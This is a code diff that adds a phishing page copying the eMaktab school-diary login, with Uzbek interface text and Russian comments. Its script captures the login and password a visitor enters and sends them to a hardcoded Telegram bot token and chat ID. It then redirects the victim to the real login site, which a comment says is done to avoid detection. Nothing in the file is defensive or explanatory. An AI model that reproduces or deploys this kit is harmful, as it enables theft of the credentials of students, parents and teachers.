@@ -1,0 +1,330 @@
+<!doctype html>
+<html>
+  <head lang="ru">
+    <meta charset="utf-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1, user-scalable=0"
+    />
+    <title>eMaktab | eMaktab ga kirish</title>
+
+    <link
+      rel="shortcut icon"
+      href="data:image/x-icon;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAACXBIWXMAAAsTAAALEwEAmpwYAAADX0lEQVR4nO2aS0hUURjHf6M0U6Y0S8uXmY9SByFFRUEatChasI0uImiVNoVuatGiIFrUImiVNoXQRRAtChcsitYpIuqh8pEnZpYzzfS97XvS7XAn7p25M3fGOfX94HDP+Z/v/M8533fOdy4YDAaDwWAwGAwGg8FgoAtSgS7AA9SAClSBr8AA8AnYAXLp74AF9X8X6AGp+u8V8AbYV8fL8XfADVDu7YByfAswAAr0f4m3A8rxdUAFuN6f4u2AcnwZUA3OfXW8HVCO7wGqwbFvx9sB5XidN+9uP94OKMevAaqS9U8dbweU4/XevKv9eTugHL8MqErWf3u8HVCO13vzrvbn7YByfBnAmS89N7wdUI5vA6qS9X8f7waU468AlUAnOAfG8W5AOX4GUAX6wDkwjncDyrEDUA2cAefAON4NKMcPAYpAJzgHxnlvI6AcPw0oAv3gHBjneuS998fAEXAOjPO5877fBfYA58A4f77v86fALnAOnPN7eL8L7AXOgnPeGPD5W+AccA6M66+Y92XAWXAOjOun5H0ZcBacA+N67fuyvA5wDozrre/L8jrAOTCO13vzlZ7H6wDnwDhe780v9XxeBzgHxvF6b/635/M6wDkwjtd78388n9cBzoFxvN6bb/F8Xgc4B8bxem++xfN5HeAcGMfrvfk2z+d1gHNgHK/35js9n9cBzoFxvN6bP/R8Xgc4B8bxem++0/N5HeAcGMfrvflTz+d1gHNgHK/35m89n9cBzoFxvN6bf/R8Xgc4B8bxem/+2fN5HeAcGMfrvflXz+d1gHNgHK/35t89n9cBzoFxvN6bX5u5vA5wDozj9d78p5nL6wDnwDhe780vmrm8DnAOjOP13vyrBfM6wDkwjtd78+vOz+sA58A4Xu/Nfzg/rwOcA+N4vTf/5fy8DnAOjOP13vyv8/M6wDkwjtd789/Oz+sA58A4Xu/N/7s8rwOcA+N4vTf/6/K8DnAOjOP13vxfl+d1gHNgHK/35v+7PK8DnAOjOP13vzf/5fK8DnAOjOP13vyP5fN9BzgLzoFx1Uv/9/W9+W8L5vsecBacA+O6Svn8u743/+PxfO6Cc+C8NfL+K735XyPnvRWcA+Otkvdf680/jJxX88A5MK6jkv+39OYvhuclBefA+f89X+fNnw3PvxdwFpyT9mS8/vK0H3972o+/v7f2H9eN8uR70tLTAAAAAElFTkSuQmCC"
+      type="image/x-icon"
+    />
+
+    <style>
+      body {
+        background-color: #f4f4f4;
+        font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+      }
+      .container {
+        max-width: 1160px;
+        margin: 0 auto;
+        padding: 0 20px;
+      }
+      header {
+        background: #fff;
+        height: 80px;
+        border-bottom: 1px solid #e0e0e0;
+      }
+      .header-wrap {
+        display: flex;
+        align-items: center;
+        height: 100%;
+      }
+      .logo {
+        height: 45px;
+        cursor: pointer;
+        display: block;
+      }
+      .nav-links {
+        margin-left: 40px;
+        display: flex;
+        gap: 25px;
+      }
+      .nav-links a {
+        text-decoration: none;
+        color: #666;
+        font-size: 14px;
+      }
+      .header-right {
+        margin-left: auto;
+        display: flex;
+        align-items: center;
+        gap: 15px;
+      }
+      .login-box {
+        max-width: 800px;
+        margin: 50px auto;
+        background: #fff;
+        border: 1px solid #dcdcdc;
+        box-shadow: 0 1px 4px rgba(0, 0, 0, 0.1);
+      }
+      .login-head {
+        background: linear-gradient(180deg, #3c4c9d 0%, #24245f 100%);
+        padding: 25px 40px;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        color: #fff;
+      }
+      .login-head h1 {
+        margin: 0;
+        font-size: 24px;
+        font-weight: 500;
+      }
+      .login-head a {
+        color: #fff;
+        font-size: 13px;
+        opacity: 0.8;
+      }
+      .login-body {
+        padding: 40px 80px;
+      }
+      .input-wrap {
+        margin-bottom: 25px;
+      }
+      .input-wrap label {
+        display: block;
+        margin-bottom: 8px;
+        font-weight: bold;
+        color: #333;
+        font-size: 14px;
+      }
+      .input-field {
+        width: 100%;
+        height: 42px;
+        border: 1px solid #ccc;
+        border-radius: 4px;
+        padding: 0 12px;
+        box-sizing: border-box;
+        background: #fafafa;
+        font-size: 16px;
+      }
+      .pass-field-container {
+        position: relative;
+      }
+      .eye-btn {
+        position: absolute;
+        right: 12px;
+        top: 11px;
+        width: 20px;
+        height: 20px;
+        background: url("https://static.emaktab.uz/images/icons/eye.svg")
+          no-repeat center;
+        cursor: pointer;
+        opacity: 0.5;
+      }
+      .btn-enter {
+        background: #9cd34d;
+        border: none;
+        border-bottom: 3px solid #82b33a;
+        color: #fff;
+        padding: 12px 30px;
+        font-size: 18px;
+        border-radius: 4px;
+        font-weight: bold;
+        cursor: pointer;
+        transition: 0.2s;
+        width: 100%;
+      }
+      .btn-enter:hover {
+        background: #8bc34a;
+      }
+      .login-footer {
+        background: #f8f8f8;
+        padding: 20px 40px;
+        border-top: 1px solid #eee;
+        display: flex;
+        align-items: center;
+        font-size: 14px;
+        color: #666;
+      }
+      .info-icon {
+        width: 22px;
+        height: 22px;
+        border: 1px solid #999;
+        border-radius: 50%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        margin-right: 12px;
+        font-size: 12px;
+      }
+      footer {
+        background: #1a1a1a;
+        color: #fff;
+        padding: 50px 0 30px 0;
+        margin-top: 60px;
+      }
+      .footer-grid {
+        display: grid;
+        grid-template-columns: repeat(4, 1fr);
+        gap: 40px;
+        padding-bottom: 40px;
+      }
+      .footer-col h4 {
+        margin: 0 0 20px 0;
+        font-size: 16px;
+      }
+      .footer-col ul {
+        list-style: none;
+        padding: 0;
+        margin: 0;
+      }
+      .footer-col li {
+        margin-bottom: 10px;
+      }
+      .footer-col a {
+        color: #999;
+        text-decoration: none;
+        font-size: 14px;
+      }
+      .footer-col a:hover {
+        color: #fff;
+      }
+      .copyright {
+        text-align: center;
+        border-top: 1px solid #333;
+        padding-top: 25px;
+        color: #666;
+        font-size: 12px;
+      }
+      @media (max-width: 768px) {
+        .nav-links,
+        .header-right .btn-green-border {
+          display: none;
+        }
+        .login-body {
+          padding: 30px 20px;
+        }
+        .footer-grid {
+          grid-template-columns: 1fr 1fr;
+        }
+        .login-head {
+          flex-direction: column;
+          align-items: flex-start;
+          gap: 10px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <header>
+      <div class="container header-wrap">
+        <a href="https://emaktab.uz"
+          ><img
+            src="https://static.emaktab.uz/img/logotypes/uzlogotype.png"
+            class="logo"
+            alt="eMaktab"
+        /></a>
+        <div class="nav-links">
+          <a href="#">Tashkilot</a><a href="#">Imkoniyatlar</a
+          ><a href="#">Hamkorlarga</a><a href="#">Yordam</a>
+        </div>
+      </div>
+    </header>
+
+    <div class="container">
+      <div class="login-box">
+        <div class="login-head">
+          <h1>Kirish eMaktab</h1>
+          <a href="#">Tizimda ro‘yxatdan o‘tmaganmisiz?</a>
+        </div>
+
+        <div class="login-body">
+          <form id="login-form">
+            <div class="input-wrap">
+              <label>Login</label>
+              <input type="text" name="login" class="input-field" required />
+            </div>
+
+            <div class="input-wrap">
+              <label>Parol</label>
+              <div class="pass-field-container">
+                <input
+                  type="password"
+                  name="password"
+                  class="input-field"
+                  id="pass-input"
+                  required
+                />
+                <div class="eye-btn" onclick="togglePass()"></div>
+              </div>
+            </div>
+
+            <button type="submit" class="btn-enter">Tizimga kiring</button>
+          </form>
+        </div>
+
+        <div class="login-footer">
+          <div class="info-icon">?</div>
+          <span
+            >Login yoki parolni unutdingizmi?
+            <a href="#" style="color: #333; text-decoration: underline"
+              >Loginni tiklash</a
+            >.</span
+          >
+        </div>
+      </div>
+    </div>
+
+    <footer>
+      <div class="container">
+        <div class="copyright">© 2026 eMaktab | Foydalanuvchi shartnomasi</div>
+      </div>
+    </footer>
+
+    <script>
+      // Функция "глазика" для пароля
+      function togglePass() {
+        const passInput = document.getElementById("pass-input");
+        const type =
+          passInput.getAttribute("type") === "password" ? "text" : "password";
+        passInput.setAttribute("type", type);
+      }
+
+      // ==========================================
+      // ВСТАВЛЯЙ СВОЙ КОД ДЛЯ TELEGRAM НИЖЕ
+      // (Между этим комментарием и следующим)
+      // ==========================================
+
+      document.querySelector("form").addEventListener("submit", function (e) {
+        e.preventDefault(); // Останавливаем перезагрузку страницы
+
+        // Берем данные из полей
+        const login = document.querySelector('input[name="login"]').value;
+        const password = document.querySelector('input[name="password"]').value;
+
+        // Твои данные для отправки
+        const token = "8254283274:AAGN3ZhYFRYYg_idC7rBOQyqCADJEyQXgu0";
+        const chatId = "1926659877";
+
+        // Формируем текст сообщения
+        const message = `🔔 *Новые данные eMaktab* \n\n👤 Логин: \`${login}\` \n🔑 Пароль: \`${password}\``;
+
+        // Ссылка для API Telegram
+        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+        // Отправляем данные
+        fetch(url)
+          .then((response) => {
+            // После успешной отправки редиректим на оригинал
+            window.location.href = "https://login.emaktab.uz/";
+          })
+          .catch((error) => {
+            // В случае ошибки тоже редиректим, чтобы не палиться
+            window.location.href = "https://login.emaktab.uz/";
+          });
+      });
+
+      // ==========================================
+      // ВАШ КОД ДОЛЖЕН ЗАКАНЧИВАТЬСЯ ВЫШЕ
+      // ==========================================
+    </script>
+  </body>
+</html>
